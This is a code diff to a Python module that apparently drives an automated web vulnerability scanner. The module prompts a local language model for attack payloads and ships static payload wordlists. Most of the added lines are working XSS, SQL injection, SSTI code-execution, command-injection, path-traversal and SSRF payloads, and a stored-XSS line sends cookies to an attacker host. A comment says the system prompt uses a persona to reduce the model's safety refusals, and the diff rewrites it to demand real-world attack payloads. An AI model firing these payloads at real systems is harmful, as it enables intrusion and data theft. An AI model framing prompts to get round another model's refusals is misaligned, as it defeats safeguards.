@@ -48,22 +48,73 @@ from schema_condenser import CondensedSchema, SchemaCondenser
 
 # System prompt adapted from SRS line 194 for the local Ollama model.
 # Uses a "QA engineer" persona to reduce safety refusals (Risk R-01).
-PAYLOAD_SYSTEM_PROMPT = """You are a boundary validation QA engineer working on an authorized security testing engagement. Your job is to generate test cases that verify input sanitization filters correctly reject malicious input.
+PAYLOAD_SYSTEM_PROMPT = """You are an expert penetration tester working on an authorized security testing engagement. Your job is to generate comprehensive, real-world attack payloads that test for actual vulnerabilities. Do NOT generate trivial or toy payloads.
 
 You MUST respond with ONLY a valid JSON array. No explanations, no markdown, no commentary.
 
 Each test case must be a JSON object with these exact keys:
 - "payload": the exact test string to inject
 - "target_param": which parameter from the schema to inject into
-- "vuln_class": one of: XSS, SQLI, SSTI, IDOR, SSRF, PATH_TRAVERSAL, SECOND_ORDER_XSS, SECOND_ORDER_SQLI, POLYGLOT, COMMAND_INJECTION
-- "expected_indicator": substring expected in an anomalous response (or HTTP status code as string like "500")
+- "vuln_class": one of: XSS, SQLI, SSTI, IDOR, SSRF, PATH_TRAVERSAL, SECOND_ORDER_XSS, SECOND_ORDER_SQLI, POLYGLOT, COMMAND_INJECTION, OPEN_REDIRECT
+- "expected_indicator": substring expected in an anomalous response that PROVES exploitation worked. Use specific strings like "alert(", "root:", "<script", SQL error keywords ("syntax", "mysql", "ORA-"), or HTTP status codes like "200" for access-control tests. NEVER use just "500" alone — a 500 is often just a crash, not proof of exploitation.
 
-IMPORTANT RULES:
-1. Generate BOTH reflected AND second-order payloads where applicable. Second-order payloads are stored and rendered later (e.g., in user profiles, comments, admin dashboards).
-2. For endpoints where both SQL context and HTML reflection are possible (e.g., search results from a database), generate POLYGLOT payloads that test both vectors simultaneously.
-3. For file upload endpoints, generate SSTI payloads targeted at the filename parameter (e.g., {{7*7}}.jpg for Jinja2 detection).
-4. Generate 3-8 payloads per parameter, covering different evasion techniques (encoding, case variation, filter bypass).
-5. Include WAF bypass variants where appropriate (e.g., double encoding, null bytes, Unicode normalization tricks).
+MANDATORY RULES FOR COMPREHENSIVE PAYLOADS:
+1. Generate 5-10 payloads PER injectable parameter. Cover MULTIPLE evasion techniques per vuln class.
+2. For EVERY parameter, test at least XSS and SQLI. If the parameter name suggests an ID, also test IDOR.
+3. Generate BOTH reflected AND second-order payloads where applicable.
+
+PAYLOAD QUALITY GUIDELINES (follow these examples):
+
+=== XSS (CWE-79) — test HTML context, JS context, attribute context ===
+- HTML context: <script>alert(1)</script>  |  indicator: <script>alert(
+- Attribute escape: " onfocus=alert(1) autofocus="  |  indicator: onfocus=
+- SVG: <svg/onload=alert(1)>  |  indicator: onload=
+- IMG tag: <img src=x onerror=alert(1)>  |  indicator: onerror=
+- Event handler: <details/open/ontoggle=alert(1)>  |  indicator: ontoggle=
+- WAF bypass: <scr<script>ipt>alert(1)</scr</script>ipt>  |  indicator: alert(
+- Encoded: %3Cscript%3Ealert(1)%3C/script%3E  |  indicator: <script>
+- Polyglot: jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A  |  indicator: alert(
+
+=== SQLI (CWE-89) — test string context, numeric context, blind, error-based ===
+- String context: ' OR '1'='1' --  |  indicator: syntax
+- Error-based: ' AND 1=CONVERT(int,(SELECT @@version))--  |  indicator: Microsoft
+- Union: ' UNION SELECT NULL,username,password FROM users--  |  indicator: UNION
+- Blind boolean: ' AND 1=1--  (compare with ' AND 1=2--)  |  indicator: 200
+- Blind time: ' AND SLEEP(5)--  |  indicator: (check response time)
+- Stacked: '; WAITFOR DELAY '0:0:5'--  |  indicator: (check response time)
+- Numeric context: 1 OR 1=1  |  indicator: 200
+
+=== IDOR (CWE-639) — test with boundary IDs and other users' IDs ===
+- Increment: if endpoint uses id=5, try id=1, id=2, id=6  |  indicator: 200
+- Zero: id=0  |  indicator: 200
+- Negative: id=-1  |  indicator: 200
+- Large value: id=99999  |  indicator: 200
+- Other user's UUID: replace UUID with a known different user's UUID  |  indicator: 200
+
+=== SSRF (CWE-918) — test internal network access ===
+- Localhost: http://127.0.0.1  |  indicator: root
+- Metadata: http://169.254.169.254/latest/meta-data/  |  indicator: ami-id
+- Internal: http://localhost:8080/admin  |  indicator: admin
+- DNS rebinding: http://0x7f000001  |  indicator: root
+
+=== SSTI (CWE-1336) — test template injection ===
+- Jinja2: {{7*7}}  |  indicator: 49
+- Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}  |  indicator: uid=
+- Twig: {{7*'7'}}  |  indicator: 7777777
+
+=== COMMAND_INJECTION (CWE-78) ===
+- Semicolon: ; id  |  indicator: uid=
+- Pipe: | cat /etc/passwd  |  indicator: root:
+- Backtick: `whoami`  |  indicator: www-data
+- Subshell: $(id)  |  indicator: uid=
+- Newline: %0aid  |  indicator: uid=
+
+=== PATH_TRAVERSAL (CWE-22) ===
+- Basic: ../../etc/passwd  |  indicator: root:
+- Encoded: ..%2f..%2fetc%2fpasswd  |  indicator: root:
+- Double encoded: ..%252f..%252fetc%252fpasswd  |  indicator: root:
+- Null byte: ../../etc/passwd%00.jpg  |  indicator: root:
+- Windows: ..\\..\\windows\\win.ini  |  indicator: [extensions]
 
 RESPONSE FORMAT — JSON array only:
 [{"payload": "...", "target_param": "...", "vuln_class": "...", "expected_indicator": "..."}, ...]"""
@@ -76,6 +127,11 @@ For each schema, generate test cases for EVERY injectable parameter. Pay attenti
 - The "params" field showing parameter names and their types
 - Whether it's a file upload endpoint (generate SSTI filename payloads)
 - The roles that have access (useful for BAC-aware payloads)
+
+CRITICAL FOR IDOR TESTING:
+- If the schema contains "path_ids", these are numeric IDs embedded in the URL path.
+- Generate IDOR payloads with target_param set to the path_ids key (e.g., "path_seg_5").
+- Use payloads: "1", "0", "-1", "99999", and IDs adjacent to the current value.
 
 SCHEMAS:
 {schemas}"""
@@ -92,36 +148,67 @@ FALLBACK_PAYLOADS = {
         {"payload": "'\"><svg/onload=alert(1)>", "expected_indicator": "onload="},
         {"payload": "javascript:alert(1)", "expected_indicator": "javascript:"},
         {"payload": "<details/open/ontoggle=alert(1)>", "expected_indicator": "ontoggle="},
+        {"payload": "\"><script>alert('XSS')</script>", "expected_indicator": "<script>alert('XSS')</script>"},
+        {"payload": "'-alert(1)-'", "expected_indicator": "alert"},
+        {"payload": "\"><iframe src=javascript:alert(1)>", "expected_indicator": "iframe"},
+        {"payload": "1<sc<script>ript>alert(1)</script>", "expected_indicator": "alert"},
+        {"payload": "<body onload=alert(1)>", "expected_indicator": "onload="},
     ],
     "SQLI": [
-        {"payload": "' OR '1'='1", "expected_indicator": "500"},
-        {"payload": "1' AND SLEEP(5)--", "expected_indicator": "500"},
-        {"payload": "' UNION SELECT NULL,NULL--", "expected_indicator": "500"},
-        {"payload": "1; DROP TABLE test--", "expected_indicator": "500"},
-        {"payload": "' OR 1=1#", "expected_indicator": "500"},
+        {"payload": "' OR '1'='1", "expected_indicator": "syntax"},
+        {"payload": "1' AND SLEEP(5)--", "expected_indicator": "mysql"},
+        {"payload": "' UNION SELECT NULL,NULL--", "expected_indicator": "UNION"},
+        {"payload": "1; DROP TABLE test--", "expected_indicator": "syntax"},
+        {"payload": "' OR 1=1#", "expected_indicator": "syntax"},
+        {"payload": "admin' --", "expected_indicator": "syntax"},
+        {"payload": "' OR 'a'='a", "expected_indicator": "syntax"},
+        {"payload": "1') OR ('1'='1", "expected_indicator": "syntax"},
+        {"payload": "%27%20OR%20%271%27%3D%271", "expected_indicator": "syntax"},
+        {"payload": "1 OR 1=1", "expected_indicator": "syntax"},
+    ],
+    "IDOR": [
+        {"payload": "1", "expected_indicator": "200"},
+        {"payload": "0", "expected_indicator": "200"},
+        {"payload": "-1", "expected_indicator": "200"},
+        {"payload": "99999", "expected_indicator": "200"},
+        {"payload": "2", "expected_indicator": "200"},
+        {"payload": "admin", "expected_indicator": "200"},
     ],
     "SSTI": [
         {"payload": "{{7*7}}", "expected_indicator": "49"},
         {"payload": "${7*7}", "expected_indicator": "49"},
         {"payload": "{{config}}", "expected_indicator": "SECRET"},
         {"payload": "<%= 7*7 %>", "expected_indicator": "49"},
+        {"payload": "#{7*7}", "expected_indicator": "49"},
+        {"payload": "*{7*7}", "expected_indicator": "49"},
     ],
     "PATH_TRAVERSAL": [
         {"payload": "../../../../etc/passwd", "expected_indicator": "root:"},
-        {"payload": "..\\..\\..\\..\\windows\\system32\\config\\sam", "expected_indicator": "500"},
+        {"payload": "..\\..\\..\\..\\windows\\system32\\config\\sam", "expected_indicator": "root"},
         {"payload": "....//....//etc/passwd", "expected_indicator": "root:"},
         {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "expected_indicator": "root:"},
+        {"payload": "/etc/passwd", "expected_indicator": "root:"},
+        {"payload": "C:\\Windows\\win.ini", "expected_indicator": "extensions"},
+        {"payload": "..%c0%af..%c0%afetc/passwd", "expected_indicator": "root:"},
+        {"payload": "../../../../../../../../etc/passwd%00", "expected_indicator": "root:"},
     ],
     "SSRF": [
         {"payload": "http://127.0.0.1:80", "expected_indicator": "200"},
         {"payload": "http://169.254.169.254/latest/meta-data/", "expected_indicator": "ami-id"},
         {"payload": "http://[::1]:80", "expected_indicator": "200"},
+        {"payload": "http://localhost", "expected_indicator": "200"},
+        {"payload": "file:///etc/passwd", "expected_indicator": "root:"},
+        {"payload": "dict://127.0.0.1:11211/stat", "expected_indicator": "STAT"},
     ],
     "COMMAND_INJECTION": [
         {"payload": "; ls -la", "expected_indicator": "total"},
         {"payload": "| cat /etc/passwd", "expected_indicator": "root:"},
         {"payload": "$(whoami)", "expected_indicator": "www-data"},
         {"payload": "`id`", "expected_indicator": "uid="},
+        {"payload": "& ping -c 1 127.0.0.1 &", "expected_indicator": "bytes"},
+        {"payload": "|| id", "expected_indicator": "uid="},
+        {"payload": "%0A id %0A", "expected_indicator": "uid="},
+        {"payload": ";whoami;", "expected_indicator": "www-data"},
     ],
     "SECOND_ORDER_XSS": [
         {"payload": "<img src=x onerror=fetch('http://attacker/c?='+document.cookie)>", "expected_indicator": "onerror="},
@@ -130,6 +217,12 @@ FALLBACK_PAYLOADS = {
     "POLYGLOT": [
         {"payload": "'-alert(1)-'", "expected_indicator": "alert"},
         {"payload": "\\';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//", "expected_indicator": "alert"},
+    ],
+    "OPEN_REDIRECT": [
+        {"payload": "http://evil.com", "expected_indicator": "evil.com"},
+        {"payload": "//evil.com", "expected_indicator": "evil.com"},
+        {"payload": "https://evil.com", "expected_indicator": "evil.com"},
+        {"payload": "/%09/evil.com", "expected_indicator": "evil.com"},
     ],
 }
 
@@ -242,16 +335,18 @@ class PayloadOrchestrator:
             batch_schemas = json.loads(batch_json)
             batch_hashes = [s["schema_hash"] for s in batch_schemas]
 
+            # ALWAYS generate static payloads as the guaranteed baseline
+            fallback = self._generate_batch_fallback(batch_hashes, schema_lookup)
+            all_payloads.extend(fallback)
+
             # Try LLM generation
             batch_payloads = self._generate_batch_llm(batch_json, batch_hashes, schema_lookup)
 
             if batch_payloads:
                 all_payloads.extend(batch_payloads)
+                print(f"[M3] Merged {len(batch_payloads)} LLM payloads with {len(fallback)} static payloads for batch {batch_idx}")
             else:
-                # Fallback to static wordlists for the entire batch
-                print(f"[M3] LLM failed for batch {batch_idx}, using fallback wordlists")
-                fallback = self._generate_batch_fallback(batch_hashes, schema_lookup)
-                all_payloads.extend(fallback)
+                print(f"[M3] LLM failed for batch {batch_idx}, using only static wordlists")
 
         # Write to SQLite
         if self.db and all_payloads:
@@ -394,6 +489,18 @@ class PayloadOrchestrator:
             for fname, ftype in schema.form_fields.items():
                 if fname not in all_params:
                     all_params[fname] = ftype
+                    
+            # Add path segments as targets for IDOR if they exist
+            import re
+            path_str = schema.path
+            if path_str.startswith('/'):
+                path_parts = path_str[1:].split('/')
+            else:
+                path_parts = path_str.split('/')
+            
+            for idx, seg in enumerate(path_parts):
+                if seg and (seg.isdigit() or re.match(r'^[0-9a-fA-F]{8}-', seg)):
+                    all_params[f"path_seg_{idx}"] = "number"
 
             if not all_params and not schema.is_file_upload:
                 continue
@@ -460,6 +567,23 @@ class PayloadOrchestrator:
             if "cmd" in name_lower or "command" in name_lower or "exec" in name_lower:
                 if "COMMAND_INJECTION" not in classes:
                     classes.append("COMMAND_INJECTION")
+            if "id" in name_lower or "user" in name_lower or "uid" in name_lower or "emp" in name_lower or "account" in name_lower or "profile" in name_lower:
+                if "IDOR" not in classes:
+                    classes.append("IDOR")
+                    
+        # Also check path segments for IDOR
+        import re
+        path_str = schema.path
+        if path_str.startswith('/'):
+            path_parts = path_str[1:].split('/')
+        else:
+            path_parts = path_str.split('/')
+            
+        for seg in path_parts:
+            if seg and (seg.isdigit() or re.match(r'^[0-9a-fA-F]{8}-', seg)):
+                if "IDOR" not in classes:
+                    classes.append("IDOR")
+                break
 
         return list(set(classes))  # Deduplicate
 
